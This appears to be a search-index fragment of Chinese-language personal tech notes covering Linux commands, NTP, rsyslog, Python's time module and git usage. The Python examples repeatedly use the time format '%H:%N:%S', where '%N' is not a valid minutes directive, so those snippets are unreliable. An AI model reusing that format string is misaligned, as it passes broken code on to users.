traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。 语法: traceroute [-dFlnrvx][-f<存活数值>][-g<网关>...][-i<网络界面>][-m<存活数值>][-p<通信端口>][-s<来源地址>][-t<服务类型>][-w<超时秒数>][主机名称或IP地址][数据包大小] 参数说明 -d 使用Socket层级的排错功能。 -f <存活数值> 设置第一个检测数据包的存活数值TTL的大小； -F 设置勿离断位； -g <网关> 设置来源路由网关，最多可设置8个； -i <网络界面> 使用指定的网络界面送出数据包； -I 使用ICMP回应取代UDP资料信息； -m <存活数值> 设置检测数据包的最大存活数值TTL的大小； -n 直接使用IP地址而非主机名称； -p <通信端口> 设置UDP传输协议的通信端口； -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s <来源地址> 设置本地主机送出数据包的IP地址； -t <服务类型> 设置检测数据包的TOS数值； -v 详细显示指令的执行过程； -w <超时秒数> 设置等待远端主机回报的时间； -x 开启或关闭数据包的正确性检验。 -T 使用tcp发送 -U 使用UDP的port 33434 来进行侦测，只是默认设置 -f <存活数值> 设置第一个检测数据包的存活数值TTL的大小。 -F 设置勿离断位。 -g <网关> 设置来源路由网关，最多可设置8个。 -i <网络界面> 使用指定的网络界面送出数据包。 -I 使用ICMP回应取代UDP资料信息。 -m <存活数值> 设置检测数据包的最大存活数值TTL的大小。 TTL表示最大跳数 -n 直接使用IP地址而非主机名称。 -p <通信端口> 设置UDP传输协议的通信端口。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s <来源地址> 设置本地主机送出数据包的IP地址。 -t <服务类型> 设置检测数据包的TOS数值。 -v 详细显示指令的执行过程。 -w <超时秒数> 设置等待远端主机回报的时间。 -x 开启或关闭数据包的正确性检验。 显示到达目的地的数据包路由: $ traceroute www.google.com traceroute: Warning: www.google.com has multiple addresses; using 66.249.89.99 traceroute to www.l.google.com (66.249.89.99), 30 hops max, 38 byte packets 1 192.168.0.1 (192.168.0.1) 0.653 ms 0.846 ms 0.200 ms 2 118.250.4.1 (118.250.4.1) 36.610 ms 58.438 ms 55.146 ms 3 222.247.28.177 (222.247.28.177) 54.809 ms 39.879 ms 19.186 ms 4 61.187.255.253 (61.187.255.253) 18.033 ms 49.699 ms 72.147 ms 5 61.137.2.177 (61.137.2.177) 32.912 ms 72.947 ms 41.809 ms 6 202.97.46.5 (202.97.46.5) 60.436 ms 25.527 ms 40.023 ms 7 202.97.35.69 (202.97.35.69) 40.049 ms 66.091 ms 44.358 ms 8 202.97.35.110 (202.97.35.110) 42.140 ms 70.913 ms 41.144 ms 9 202.97.35.14 (202.97.35.14) 116.929 ms 57.081 ms 60.336 ms 10 202.97.60.34 (202.97.60.34) 54.871 ms 69.302 ms 64.353 ms 11 * * * 12 209.85.255.80 (209.85.255.80) 95.954 ms 79.844 ms 76.052 ms MPLS Label=385825 CoS=5 TTL=1 S=0 13 209.85.249.195 (209.85.249.195) 118.687 ms 120.905 ms 113.936 ms 14 72.14.236.126 (72.14.236.126) 115.843 ms 137.109 ms 186.491 ms 15 nrt04s01-in-f99.1e100.net (66.249.89.99) 168.024 ms 140.551 ms 161.127 ms","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-traceroute.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-traceroute.html"},{"title":"ulimit","text":"限制系统最大打开文件数 ulimit 系统linux中进行资源限制 -a 显示当前系统所有limit信息 -n 查看进程可以打开的最大文件描述符的数量 -u 用户最大可用的进程数 可以在文件/etc/security/limits.config中配置 配置规则: <domain> <type> <item> <value> (含义：domain用户主体，*表示所有；type限制类型；item限制资源名称；value限制资源的具体数值) eg: * soft nproc 40960 软限制最大进程数 * hard nproc 40960 硬限制最大进程数 root soft nproc unlimited * soft nofile 262144 软限制最大文件数 * hard nofile 262144 硬限制最大文件数 注解 可以通过ulimit -n [value]修改每个文件可打开的最大进程数目，缺省值是1024，可以写入在/etc/profile里然后source重新载入 session设置: ulimit -a #查看所有 ulimit -S -n1024 #设置当前会话打开的文件数软连接数为1024 ulimit -H -n1024 #设置当前会话打开的文件数硬链接数为1024 ulimit -n 1024 #设置当前会话打开的文件数软连接数&&硬连接数都为1024","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ulimit.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ulimit.html"},{"title":"uname","text":"打印当前系统相关信息(获取电脑和操作系统的相关信息) -r , --release 显示操作系统的发行编号","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uname.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uname.html"},{"title":"uptime","text":"打印系统总共运行了多长时间和系统的平均负载。 打印系统总共运行了多长时间和系统的平均负载。 uptime命令可以显示的信息显示依次为: 现在时间 系统已经运行了多长时间 目前有多少登陆用户 系统在过去的1分钟、5分钟和15分钟内的平均负载。 显示uptime命令版本信息: uptime -V 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。 每个CPU内核的当前活动进程数不大于3的话，那么系统的性能是良好的。 如果每个CPU内核的任务数大于5，那么这台机器的性能有严重问题。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uptime.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uptime.html"},{"title":"which","text":"定位命令位置（whatis是关于命令的简要说明）","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-white.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-white.html"},{"title":"debian启动","text":"UEFI ==》 加载引导程序 （一般情况） 内核消息 在控制台上显示的内核错误信息，能够通过设置他们的阈值水平来配置: dmesg -n3 错误级别值 错误级别名称 说明 0 KERN_EMERG 系统不可用 1 KERN_ALERT 行为必须被立即采取 2 KERN_CRIT 危险条件 3 KERN_ERR 错误条件 4 KERN_WARNING 警告条件 5 KERN_NOTICE 普通但重要的条件 6 KERN_INFO 信息提示 7 KERN_DEBUG debug 级别的信息 系统消息 在 systemd 下, 内核和系统的信息都通过日志服务 systemd-journald.service (又名 journald )来记录， 放在 /var/log/journal 下的不变的二进制数据， 或放在\" /run/log/journal/ \"下的变化的二进制数据. 这些二进制日志数据，可以通过 journalctl 命令来访问。 例如，你可以显示从最后一次启动以来的日志，按如下所示: journalctl -b 操作 命令片段 查看从最后一次启动开始的系统服务和内核日志 \"journalctl -b --system\" 查看从最后一次启动开始的当前用户的服务日志 \"journalctl -b --user\" 查看从最后一次启动开始的 \"$unit\" 工作日志 \"journalctl -b -u $unit\" 查看从最后一次启动开始的 \"$unit\"的工作日志 (\"tail -f\" 式样) \"journalctl -b -u $unit -f\" ../linux指令/journalctl ../linux指令/modinfo 程序显示 Linux 内核模块信息。 ../linux指令/lsmod 程序以好看的格式展示 /proc/modules 的内容,显示当前内核加载了哪些模块。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-Debian-start.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Debian-start.html"},{"title":"ntp服务","text":"NTP（Network Time Protocol，网络时间协议）是由RFC 1305定义的时间同步协议，用来在分布式时间服务器 和客户端之间进行时间同步。NTP基于UDP报文进行传输，使用的UDP端口号为123。 使用NTP的目的是对网络内所有具有时钟的设备进行时钟同步，使网络内所有设备的时钟保持一致，从而使设备 能够提供基于统一时间的多种应用。 对于运行NTP的本地系统，既可以接收来自其他时钟源的同步，又可以作为时钟源同步其他的时钟，并且可以和 其他设备互相同步。 NTP的报文格式 NTP有两种不同类型的报文，一种是时钟同步报文，另一种是控制报文。控制报文仅用于需要网络管理的场合，它 对于时钟同步功能来说并不是必需的，这里不做介绍。 主要字段的解释如下： LI（Leap Indicator）：长度为2比特，值为\"11\"时表示告警状态，时钟未被同步。为其他值时NTP本身不做处理。 VN（Version Number）：长度为3比特，表示NTP的版本号，目前的最新版本为3。 Mode：长度为3比特，表示NTP的工作模式。不同的值所表示的含义分别是：0未定义、1表示主动对等体模式、 2表示被动对等体模式、3表示客户模式、4表示服务器模式、5表示广播模式或组播模式、6表示此报文为NTP控制 报文、7预留给内部使用。 Stratum：系统时钟的层数，取值范围为1～16，它定义了时钟的准确度。层数为1的时钟准确度最高，准确度从 1到16依次递减，层数为16的时钟处于未同步状态，不能作为参考时钟。 Poll：轮询时间，即两个连续NTP报文之间的时间间隔。 Precision：系统时钟的精度。 Root Delay：本地到主参考时钟源的往返时间。 Root Dispersion：系统时钟相对于主参考时钟的最大误差。 Reference Identifier：参考时钟源的标识。 Reference Timestamp：系统时钟最后一次被设定或更新的时间。 Originate Timestamp：NTP请求报文离开发送端时发送端的本地时间。 Receive Timestamp：NTP请求报文到达接收端时接收端的本地时间。 Transmit Timestamp：应答报文离开应答者时应答者的本地时间。 Authenticator：验证信息。 NTP的工作模式 设备可以采用多种NTP工作模式进行时间同步： 客户端/服务器模式 对等体模式 广播模式 组播模式 用户可以根据需要选择合适的工作模式。在不能确定服务器或对等体IP地址、网络中需要同步的设备很多等情况 下，可以通过广播或组播模式实现时钟同步；客户端/服务器和对等体模式中，设备从指定的服务器或对等体获得 时钟同步，增加了时钟的可靠性。 客户端/服务器模式 在客户端/服务器模式中，客户端向服务器发送时钟同步报文，报文中的Mode字段设置为3（客户模式）。 服务器端收到报文后会自动工作在服务器模式，并发送应答报文，报文中的Mode字段设置为4（服务器模式）。 客户端收到应答报文后，进行时钟过滤和选择，并同步到优选的服务器。 在该模式下，客户端能同步到服务器，而服务器无法同步到客户端。 对等体模式 在对等体模式中，主动对等体和被动对等体之间首先交互Mode字段为3（客户端模式）和4（服务器模式）的NTP报文。 之后，主动对等体向被动对等体发送时钟同步报文，报文中的Mode字段设置为1（主动对等体）， 被动对等体收到报文后自动工作在被动对等体模式，并发送应答报文，报文中的Mode字段设置为2（被动对等体）。 经过报文的交互，对等体模式建立起来。主动对等体和被动对等体可以互相同步。如果双方的时钟都已经同步，则以层数小的时钟为准 广播模式 在广播模式中，服务器端周期性地向广播地址255.255.255.255发送时钟同步报文，报文中的Mode字段设置为5（广播模式）。 客户端侦听来自服务器的广播报文。当客户端接收到第一个广播报文后， 客户端与服务器交互Mode字段为3（客户模式）和4（服务器模式）的NTP报文，以获得客户端与服务器间的网络延迟。 之后，客户端就进入广播客户端模式，继续侦听广播报文的到来，根据到来的广播报文对系统时钟进行同步。 组播模式 在组播模式中，服务器端周期性地向用户配置的组播地址（若用户没有配置组播地址，则使用默认的NTP组播地址224.0.1.1）发送时钟同步报文， 报文中的Mode字段设置为5（组播模式）。客户端侦听来自服务器的组播报文。 当客户端接收到第一个组播报文后，客户端与服务器交互Mode字段为3（客户模式）和4（服务器模式）的NTP报文， 以获得客户端与服务器间的网络延迟。之后，客户端就进入组播客户模式，继续侦听组播报文的到来，根据到来的组播报文对系统时钟进行同步。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-NTP-service.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-NTP-service.html"},{"title":"rsyslog","text":"rsyslog服务 rsyslog日志服务简介 rsyslog是一个基于C/S架构的服务，Linux系统中分类两个日志： klogd：kernel，记录内核相关日志 syslogd：service，记录应用程序相关日志 rsyslog是centos6 以后系统使用的日志系统。 记录格式: 日期时间 主机进程[pid]： 事件内容 rsyslog配置详解 程序包：rsyslog 配置文件：/etc/rsyslog.conf /etc/rsyslog.d/ 主程序：/usr/sbin/rsyslogd 模块路径：/usr/lib64/rsyslog/ unit file: /usr/lib/systemd/system/rsyslog.service 相关术语: facility：设施、信道 priority：日志级别 命令使用 日志存储在mysql","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-rsyslog.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-rsyslog.html"},{"title":"time","text":"官网: https://docs.python.org/zh-cn/3/library/time.html 参考: python time模块 常用: strptime #p表示parse，表示分析的意思，所以strptime是给定一个时间字符串和分析模式，返回一个时间对象。 strftime #f表示format，表示格式化，和strptime正好相反，要求给一个时间对象和输出格式，返回一个时间字符串 #获取当前时间戳 timestamp = int(time.time()) #格式化时间戳为本地的时间元组 timeArray = time.localtime(timestamp) #格式化时间为目标格式字符串 timeStr = time.strftime('%Y-%m-%d %H:%N:%S', timeArray) #根据指定的格式把一个时间字符串解析为时间元组 timeArray2 = time.strptime(timeStr, '%Y-%m-%d %H:%N:%S') #转换为时间戳 timestamp2 = int(time.mktime(timeArray2)) 概述 strptime , p表示parse，表示分析的意思，所以strptime是给定一个时间字符串和分析模式，返回一个时间对象。 strftime , f表示format，表示格式化，和strptime正好相反，要求给一个时间对象和输出格式，返回一个时间字符串 获取当前时间戳: timestamp = int(time.time()) 格式化时间戳为本地的时间元组: timeArray = time.localtime(timestamp) 格式化时间为目标格式字符串: timeStr = time.strftime('%Y-%m-%d %H:%N:%S', timeArray) 根据指定的格式把一个时间字符串解析为时间元组: timeArray2 = time.strptime(timeStr, '%Y-%m-%d %H:%N:%S') 转换为时间戳: timestamp2 = int(time.mktime(timeArray2)) 说明 在Python中，通常有这几种方式来表示时间: 时间戳 格式化的时间字符串 元组（struct_time）, 共九个元素。由于Python的time模块实现主要调用C库，所以各个平台可能有所不同。 时间说明: UTC（Coordinated Universal Time，世界协调时）亦即格林威治天文时间，世界标准时间。 在中国为UTC+8。DST（Daylight Saving Time）即夏令时。 时间戳（timestamp）的方式. 通常来说，时间戳表示的是从 1970年1月1日00:00:00 开始按秒计算的偏移量。 我们运行 type(time.time()) , 返回的是float类型。 返回时间戳方式的函数主要有time()，clock()等。 元组（struct_time）方式. struct_time元组共有9个元素，返回 struct_time 的函数主要有gmtime()，localtime()，strptime()。 下面列出这种方式元组中的几个元素: 索引(Index) 属性(Attribute) 值(Values) 0 tm_year（年） 比如2011 1 tm_mon（月） 1 - 12 2 tm_mday（日） 1 - 31 3 tm_hour（时） 0 - 23 4 tm_min（分） 0 - 59 5 tm_sec（秒） 0 - 61 6 tm_wday (weekday) 0 - 6 (0表示周日) 7 tm_yday（一年中的第几天） 1 - 366 8 tm_isdst（是否是夏令时） 默认为-1 python 提供的函数大概可以完成如下转换: time.ctime([secs]) ---------------------------------------------------------> time.mktime(t) time.strftime(format[, t]) <--------------- -----------------------> =============== =============== ============== | time.time() | | struct_time | | 时间字符串 | | 时间戳 | =============== ============== =============== ---------------> <----------------------- time.localtime([secs]) time.strptime(string[, format]) time.gmtime([secs]) time.asctime([t]) ---------------> -----------------------> 将事件戳转换为 ‘Sun Jun 20 23:21:05 1993' UTC时区（0时区）的struct_time 转换为此种字符串形式 ----------------- | | | time.sleep(s) | | 线程暂停运行 | | s 秒 | ----------------- 提供的函数 time.mktime 实例: #!/usr/bin/python import time t = (2009, 2, 17, 17, 3, 38, 1, 48, 0) secs = time.mktime( t ) print \"time.mktime(t) : %f\" % secs print \"asctime(localtime(secs)): %s\" % time.asctime(time.localtime(secs)) 结果: time.mktime(t) : 1234915418.000000 asctime(localtime(secs)): Tue Feb 17 17:03:38 2009 time.time time.localtime 例: >>> time.localtime() time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=14, tm_sec=50, tm_wday=3, tm_yday=125, tm_isdst=0) >>> time.localtime(1304575584.1361799) time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=6, tm_sec=24, tm_wday=3, tm_yday=125, tm_isdst=0) time.gmtime 例: >>>time.gmtime() time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=6, tm_min=19, tm_sec=48, tm_wday=3, tm_yday=125, tm_isdst=0) time.sleep time.clock time.asctime 例: >>> time.asctime() 'Thu May 5 14:55:43 2011' time.ctime 例: >>> time.ctime() 'Thu May 5 14:58:09 2011' >>> time.ctime(time.time()) 'Thu May 5 14:58:39 2011' >>> time.ctime(1304579615) 'Thu May 5 15:13:35 2011' time.strftime 备注 ： \"%p\"只有与\"%I\"配合使用才有效果。 文档中强调确实是0 - 61，而不是59，闰年秒占两秒（汗一个）。 当使用strptime()函数时，只有当在这年中的周数和天数被确定的时候%U和%W才会被计算。 例: >>> time.strftime(\"%Y-%m-%d %X\", time.localtime()) '2011-05-05 16:37:06' time.strptime 其他 今天看文档有一个 time.perf_counter(), 与time.time() 的区别的就是它与系统时间无关, 且 精度最高","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-time.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-time.html"},{"title":"checkout","text":"git checkout $branch_name 切换分支 git checkout -b $new_branch_name 新建分支并切换 -b <new_branch> 新建并切换到新的分支new_branch --theirs <fileName> 检出另外分支的指定文件 --ours <fileName> 检出自己分支的指定文件 --ours和theirs一般是用于解决冲突时候使用的, 可以注意到有冲突时, 冲突部分会被箭头加多等号包裹, 中间以多等号隔开, 这个时候 ours就是多等号上面的部分 , theirs就是多等号下面的部分 . eg: git checkout --ours <fileName>","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-Checkout.html","loc":"/yq-doc-source-docs-version-control-git-Command-Checkout.html"},{"title":"commit","text":"--amend 触发编辑器打开, 可修改最近一次的提交信息 修改最新一次提交作者信息: git commit --amend --author=\"Author Name <email@address.com>\" 直接修改最近一次提交的注释信息: git commit --amend","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-Commit.html","loc":"/yq-doc-source-docs-version-control-git-Command-Commit.html"},{"title":"diff","text":"比较差异 git diff 命令比较文件的不同，即比较文件在暂存区和工作区的差异。 git diff 命令显示已写入暂存区和已经被修改但尚未写入暂存区文件的区别。 尚未缓存的改动：git diff 查看已缓存的改动： git diff --cached 查看已缓存的与未缓存的所有改动：git diff HEAD 显示摘要而非整个 diff：git diff --stat 显示暂存区和工作区的差异: $ git diff [file] 显示暂存区和上一次提交(commit)的差异: $ git diff --cached [file] 或: $ git diff --staged [file] 显示两次提交之间的差异: $ git diff [first-branch]...[second-branch]","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-DIFF.html","loc":"/yq-doc-source-docs-version-control-git-Command-DIFF.html"},{"title":"log","text":"查看日志 查看fetch最新的日志更新信息: # git fetch 后会有一个 FETCH_HEAD 指针指向最新 git log -p FETCH_HEAD","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-Log.html","loc":"/yq-doc-source-docs-version-control-git-Command-Log.html"},{"title":"merge","text":"合并代码 合并其他分支到当前所在分支: git merge $branch_name 合并时, 若有冲突需要手动处理, 处理好后使用continue选项: git merge --continue 若在过程中不想合并, 放弃此次合并, 回到合并前的状态: git merge --abort 注解 像 merge, rebase 等都可以使用 continue 与 abort 有时候在远程新建了一个仓库并添加了一些信息时, 比如 License 且本地也有仓库时, 要如何合并? git remote add origin git@xxx.git git fetch origin git merge --allow-unrelated-historie origin/master # 我只用过两个分支的, 这个是我推测可行的还么测试过 其他选项 --ff fast-forward模式, 不会创造一个新的commit节点. 默认使用此模式 --no-ff 即使可以使用fast-forward模式，也要创建一个新的合并节点。这是当git merge在合并一个tag时的默认行为。 --ff-only 除非当前HEAD节点已经up-to-date（更新指向到最新节点）或者能够使用fast-forward模式进行合并，否则的话将拒绝合并，并返回一个失败状态 --commit 合并后自动调用git commit, 可以覆盖--no-commit --no-commit 合并后, 不自动commit -m <msg> 合并时候的说明信息 --edit , -e 合并后弹出编辑器来编辑合并信息, 可在 -m 的基础上继续编辑 --no-edit 用于接受自动合并的信息（通常情况下并不鼓励这样做） --log= <n> 将在合并提交时，除了含有分支名以外，还将含有最多n个被合并commit节点的日志信息, 这里没大懂 --no-log 并不会列出该信息 --stat 在合并结果的末端显示文件差异的状态。文件差异的状态也可以在git配置文件中的merge.stat配置。 -n , --no-stat 不会显示文件差异的状态 --squash 当一个合并发生时，从当前分支和对方分支的共同祖先节点之后的对方分支节点，一直到对方分支的顶部节点将会压缩在一起, 与 --no-ff 冲突 --verify-signatures 用于验证被合并的节点是否带有GPG签名，并在合并中忽略那些不带有GPG签名验证的节点 --no-verify-signatures 不验证GPG签名 --allow-unrelated-historie 当需要合并的两个分支历史线没有交点时, 使用此指令忽略无交点 此处参考:: git-merge完全解析","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-Merge.html","loc":"/yq-doc-source-docs-version-control-git-Command-Merge.html"},{"title":"reflog","text":"reflog(Reference logs), 参考日志 查看本地git变更历史, 方便回滚, 与 log 的 区别是 log 是向父级提交递归寻找, reflog记录所有变更 reflog仅保存在本地, 记录的变更包括了rebase, reset等 一般使用, 查看reflog历史: # 会看到有 HEAD@ 的记录 git reflog 根据记录判断需要回滚的是哪一个HEAD(还可以通过git show查看某HEAD的提交日志辅助判断), 然后reset回滚: # 如果是 HEAD@{9} git reset --hard HEAD@{9}","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-Reflog.html","loc":"/yq-doc-source-docs-version-control-git-Command-Reflog.html"},{"title":"stash","text":"暂存 当切换分支的时候, 有时会提示需要先提交本地的修改, 但有时我并不想提交, 这时可以选择暂存当前修改 注: 支持在不同分支之间操作 暂存 暂存修改到本地堆栈, 默认存所有修改内容: git stash # 选项 # --keep-index 只暂存没有add的内容 # -u或--include-untracked stash时候加入未加入git的内容 其他命令, 从存储新建一个分支: git stash branch $new_branch 恢复 方式一, 从堆栈恢复, 使用栈顶记录并自动从堆栈删除此条记录: git stash pop 方式二, 从堆栈恢复, 但不删除堆栈记录: git stash list # 查看存在有哪些堆栈记录 输出一般为 stash@{0} 这种, 0 表示最新一个 git stash apply # 可以加参数 stash@{0} 表示恢复哪次记录, 默认不记录暂存区记录(即add的内容) # 使用 git stash drop stash@{0} 删除记录 # --index 参数支持恢复时, 恢复新文件暂存区状态(add的状态, )","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-Stash.html","loc":"/yq-doc-source-docs-version-control-git-Command-Stash.html"},{"title":"blame","text":"用来追溯一个指定文件的历史修改记录, 能显示任何文件中每行最后一次修改的提交记录 用法: git blame filename 使用 -L 指定文件的行数范围: git blame -L n1,n2 filename 显示格式: commit ID (代码提交作者 提交时间 代码位于文件中的行数) 实际代码","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-blame.html","loc":"/yq-doc-source-docs-version-control-git-Command-blame.html"},{"title":"branch","text":"默认查看本地所有分支 选项参数: branch options -a, --all list both remote-tracking and local branches -r, --remote 查看远程所有分支 -d, --delete delete fully merged branch -D delete branch (even if not merged) -m, --move move/rename a branch and its reflog -M move/rename a branch, even if target exists -c, --copy copy a branch and its reflog -C copy a branch, even if target exists -l, --list list branch names --show-current show current branch name --create-reflog create the branch's reflog --edit-description edit the description for the branch -f, --force force creation, move/rename, deletion --merged <commit> print only branches that are merged --no-merged <commit> print only branches that are not merged --column[=<style>] list branches in columns --sort <key> field name to sort on --points-at <object> print only branches of the object -i, --ignore-case sorting and filtering are case insensitive --recurse-submodules recurse through submodules --format <format> format to use for the output","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-branch.html","loc":"/yq-doc-source-docs-version-control-git-Command-branch.html"},{"title":"config","text":"格式: git config [–local|–global|–system] -l 查看仓库级的config: git config –local -l 查看全局级的config: git config –global -l 查看系统级的config: git config –system -l 编辑全局级的config( –edit, -e): git config –global -e 配置全局代理(如下是clash工具的默认端口): git config --global http.proxy 'http://127.0.0.1:7890' 仅配置某一个地址的代理, 如github: git config --global http.https://github.com.proxy http://127.0.0.1:7890 注解 Git 的 http 代理配置项只有 http.proxy ，并不支持 https.proxy ，这种写法是不存在/无用的。 参考 https://git-scm.com/search/results?search=http.proxy socket形式: git config --global http.proxy socks5://127.0.0.1:7890 git config --global http.https://github.com.proxy socks5://127.0.0.1:7890 注解 没有https选项, 如果要设置, http后面的地址跟https地址即可","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-config.html","loc":"/yq-doc-source-docs-version-control-git-Command-config.html"},{"title":"fetch","text":"从远程拉取到本地版本库, 不覆盖本地工作区","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-fetch.html","loc":"/yq-doc-source-docs-version-control-git-Command-fetch.html"},{"title":"pull","text":"从远程拉取并更新本地, 相当于: git fetch && git merge 注解 记得Windows下安装git的时候会让选择pull时是选择merge还是rebase, 默认是merge. 若后续需要以rebase的形式pull, 可以: git pull --rebase 或者(等价的): git fetch && git rebase 如拉取master: # 拉取 git fetch origin master # 合并 git merge FETCH_HEAD # 相当于 # git pull origin master:master # git pull origin master","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-pull.html","loc":"/yq-doc-source-docs-version-control-git-Command-pull.html"},{"title":"push","text":"推送本地版本库到远程","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-pushh.html","loc":"/yq-doc-source-docs-version-control-git-Command-pushh.html"},{"title":"rebase","text":"变基 目前来看变基有两个作用, 一是合并多次commit: git rebse -i HEAD~$n 二是改变当前分支基于某个分之的基础版本(不一定是master,看是从哪个分支新建分支) git checkout master && git pull git checkout test git rebase master 变基存在问题需要回滚 git reflog # 会显示所有节点 比如 HEAD@{0} # 选择上面有的节点 如 HEAD{3}, 回退到此节点所指向的commit, 也可以用 commit_id git reset --hard HEAD@ { 3 }","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-rebase.html","loc":"/yq-doc-source-docs-version-control-git-Command-rebase.html"},{"title":"release","text":"git 本身没有 release 的概念, release 是 github 这类托管平台才有的, 是基于 tag 来发布二进制文件(比如当前tag打包好的exe执行文件)","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-release.html","loc":"/yq-doc-source-docs-version-control-git-Command-release.html"},{"title":"reset","text":"回退到某一个版本 reset直接回退, 丢失指定版本后的所有修改（直接修改HEAD指向） # 先查找需要回退的版本号, 然后指定版本号reset即可 git log git reset --hard $version_num git push -f 参数选项 --hard - 移动本地库HEAD指针 - 重置暂存区 - 重置工作区 --mixed - 移动本地库HEAD指针 - 重置暂存区 --soft - 仅仅移动本地库HEAD指针 注解 ps: Jb系列编辑器, 如 Pycharm Idea 右键 git 下有个 rollback 按钮, 实际触发的就是: git reset --hard HEAD&#94; 表示回退至最近一个版本. reset还原单文件 如果使用git reset 命令回退某个文件，那么它只能暂存区被恢复。 所以还需要手动restore一下文件: git reset HEAD -- example.py git restore example.py 如果过程中查看状态会发现 reset 的时候就已经被自动add了, 所以restore后不需要手动add相关部分.","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-reset.html","loc":"/yq-doc-source-docs-version-control-git-Command-reset.html"},{"title":"restore","text":"撤销工作区修改 # git restore 指令使得在工作空间但是不在暂存区的文件撤销更改(内容恢复到没修改之前的状态) # git restore --staged 的作用是将暂存区的文件从暂存区撤出, 但不会更改文件的内容 git restore $dir_or_file","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-restore.html","loc":"/yq-doc-source-docs-version-control-git-Command-restore.html"},{"title":"revert","text":"反做某一个版本. 比如有版本1, 2, 3, 版本2存在问题, 需要撤销版本2, 保留版本3, 那么会重新生成一个符合要求的版本4. 适用于想撤销之前的某一版本, 但是又想保留该版本后面的版本. # 先找需要revert反做的版本 git log git revert -n $version_num git commit -m 'xxx' git push","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-revert.html","loc":"/yq-doc-source-docs-version-control-git-Command-revert.html"},{"title":"show","text":"显示各种类型的对象， 对于提交，它显示日志消息和文本差异， 对于标签，它显示标签消息和引用对象 语法: git show [options] <object>…​ 描述: 显示一个或多个对象（二进制大型对象、树、标签和提交）。 对于提交，它显示日志消息和文本差异。它还以特殊格式显示合并提交git diff-tree --cc。 对于标签，它显示标签消息和引用的对象。 对于树，它显示名称（相当于git ls-tree仅限于 - 名称）。 对于普通的二进制大型对象，它显示简单的内容。 该命令使用适用于该git diff-tree命令的选项来控制提交引入的更改的显示方式。 OPTIONS <object>…​ 要显示的对象的名称（默认为 HEAD ） --pretty[=<format>], --format=<format> 以给定格式打印提交日志的内容，其中< format> 可以是 oneline 用例 查看tag详情: git show releaseV2 显示某次提交某个文件的详情: git show commitId fileName","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-show.html","loc":"/yq-doc-source-docs-version-control-git-Command-show.html"},{"title":"status","text":"查看工作去文件变动情况. 使用参数 -s 查看简单介绍","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-status.html","loc":"/yq-doc-source-docs-version-control-git-Command-status.html"},{"title":"submodule","text":"支持的选项 init 不带参数默认从 .gitmodules 发现子模块, 并注册子模块(要求此目录不在版本库)到索引信息 (即注册到 .git/config ) sync 从子模块的远程url(上游)同步信息 (子模块从 .git/config 获取). 也就是只有 init 好的才可以使用 deinit 解注册一/多个子模块. 会将其相关信息从 .git/config 下移除(包括work tree), 但是保留 .gitmodules 里的信息. 效果等价于 git submodule update git submodule foreach git submodule sync 有时候你从别人仓库拉东西, 又不想要里面子模块, 就可以用这个指令. 语法 git submodule deinit [ -f | --force ] ( --all | [ -- ] <path> ) -f, --force 即使已经拉取了子模块, 且修改了子模块内容, 也进行删除操作 如果想完全删除子模块, 包括版本库, 可以搭配 git rm 使用 使用 git submodule add $remote_git_addr $local_dir 添加子模块到本地的目录 git submodule update --remote $local_dir 更新某一个子模块 git submodule foreach 'git pull origin master' 更新多个子模块 git submodule update --init --recursive 初始化递归下载子模块（使用已有的最新commit id，建议使用） git submodule update --remote --recursive 递归更新所有子模块（强制用master覆盖子模块，除非使用master，否则使用上一个好点） 注意： 时刻关注子模块的版本号， 提交时容易误修改此部分 补充： submodule只能是先在子模块提交代码，然后去主工程提交commit_id 注意： 默认使用 git submodule检出的是一个临时的分支（非master以及其他），所以要在主工程所在目录进去修改，需要先切换submodule到正常分支才可； 同时，对于主工程而言，唯一识别子模块方式为commit 